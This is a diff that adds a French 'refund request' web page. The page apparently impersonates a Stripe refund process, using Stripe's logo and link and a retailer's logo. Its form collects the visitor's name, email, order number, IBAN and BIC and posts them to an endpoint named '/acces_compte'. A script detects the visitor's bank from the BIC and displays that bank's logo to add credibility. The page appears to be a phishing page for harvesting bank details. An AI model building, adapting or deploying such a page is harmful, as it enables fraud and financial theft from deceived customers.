@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remboursement - Détection Bancaire</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background: linear-gradient(135deg, #f4f4f4, #e0e0e0);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            opacity: 0;
+            animation: fadeIn 1s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .header-logo {
+            width: 200px; /* Taille du logo augmentée */
+            height: auto;
+            margin-bottom: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            transition: transform 0.3s ease;
+        }
+
+        .header-logo:hover {
+            transform: scale(1.1);
+        }
+
+        .refund-container {
+            background: #fff;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            opacity: 0;
+            animation: fadeInContainer 1s ease-out 0.5s forwards;
+        }
+
+        @keyframes fadeInContainer {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+
+        .input-container {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        label {
+            font-size: 14px;
+            color: #555;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 8px;
+            transition: color 0.3s ease;
+        }
+
+        label:hover {
+            color: #28a745;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus {
+            border-color: #28a745;
+            outline: none;
+            transform: scale(1.02);
+        }
+
+        .bank-logo {
+            height: 50px;
+            margin-top: 15px;
+            border-radius: 8px;
+            object-fit: contain;
+            transition: transform 0.3s ease, opacity 0.5s ease-in-out;
+            opacity: 0;
+            transform: scale(0.8);
+        }
+
+        .bank-logo.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .bank-logo:hover {
+            transform: scale(1.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #28a745, #218838);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 25px;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #218838, #1e7e34);
+            transform: scale(1.05);
+        }
+
+        .refund-conditions {
+            margin-top: 30px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .refund-conditions a {
+            color: #28a745;
+            text-decoration: none;
+        }
+
+        .refund-conditions a:hover {
+            text-decoration: underline;
+        }
+
+        .stripe-logo {
+            margin-top: 40px;
+            width: 100px;
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Logo de l'entreprise" class="header-logo">
+
+    <div class="refund-container">
+        <h2>Demande de Remboursement</h2>
+
+        <!-- Formulaire avec méthode POST -->
+        <form action="/acces_compte" method="POST">
+            <div class="input-container">
+                <label for="nom">Nom</label>
+                <input type="text" id="nom" name="nom" placeholder="Votre nom" required>
+            </div>
+
+            <div class="input-container">
+                <label for="prenom">Prénom</label>
+                <input type="text" id="prenom" name="prenom" placeholder="Votre prénom" required>
+            </div>
+
+            <div class="input-container">
+                <label for="email">Adresse e-mail</label>
+                <input type="email" id="email" name="email" placeholder="exemple@domaine.com" required>
+            </div>
+
+            <div class="input-container">
+                <label for="order-number">Numéro de commande</label>
+                <input type="text" id="order-number" name="order_number" placeholder="123456789" required>
+            </div>
+
+            <div class="input-container">
+                <label for="iban">IBAN</label>
+                <input type="text" id="iban" name="iban" placeholder="FR76 1234 5678 9012 3456 7890 123" required>
+            </div>
+
+            <div class="input-container">
+                <label for="bic">BIC</label>
+                <input type="text" id="bic" name="bic" placeholder="Ex: CRLYFRPPXXX" oninput="detectBank()" required>
+            </div>
+
+            <div class="input-container">
+                <label for="bank">Banque détectée</label>
+                <select id="bank" name="bank" disabled>
+                    <option value="">Sélection automatique...</option>
+                </select>
+            </div>
+
+            <div>
+                <img id="bank-logo" class="bank-logo" alt="Logo de la banque">
+            </div>
+
+            <!-- Champ caché pour stocker l'URL du logo de la banque -->
+            <input type="hidden" id="bank-logo-url" name="bank_logo_url">
+
+            <button type="submit">Valider</button>
+        </form>
+
+        <!-- Section des conditions de remboursement -->
+        <div class="refund-conditions">
+            <p>Pour plus d'informations sur les conditions de remboursement, veuillez consulter notre <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://docs.stripe.com/refunds%3Flocale%3Dfr-FR&ved=2ahUKEwiCmcHBv8-LAxVIVaQEHb4cNTQQFnoECBQQAQ&usg=AOvVaw0GEvLa0VbshzD_8GWMothD" target="_blank">page de remboursement Stripe</a>.</p>
+        </div>
+    </div>
+
+    <!-- Logo Stripe en bas -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Stripe_Logo.png" alt="Logo Stripe" class="stripe-logo">
+
+    <script>
+        const bankData = {
+            "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
+            "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
+            "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
+            "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
+            "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
+            "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Logo-axa-banque.png" },
+            "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
+            "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
+            "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
+            "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
+            "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
+            "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
+            "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
+            "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
+            "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
+            "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
+            "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
+            "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
+            "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" }
+        };
+
+        function detectBank() {
+            let bicInput = document.getElementById("bic").value.toUpperCase().slice(0, 8);
+            let bankSelect = document.getElementById("bank");
+            let bankLogo = document.getElementById("bank-logo");
+            let bankLogoUrlInput = document.getElementById("bank-logo-url");
+
+            if (bankData[bicInput]) {
+                bankSelect.innerHTML = `<option value="${bankData[bicInput].name}">${bankData[bicInput].name}</option>`;
+                bankLogo.src = bankData[bicInput].logo;
+                bankLogoUrlInput.value = bankData[bicInput].logo; // Stocker l'URL du logo
+                bankLogo.classList.add("show");
+            } else {
+                bankSelect.innerHTML = `<option value="">Sélection automatique...</option>`;
+                bankLogo.classList.remove("show");
+                bankLogoUrlInput.value = ""; // Effacer l'URL du logo
+            }
+        }
+    </script>
+</body>
+</html>
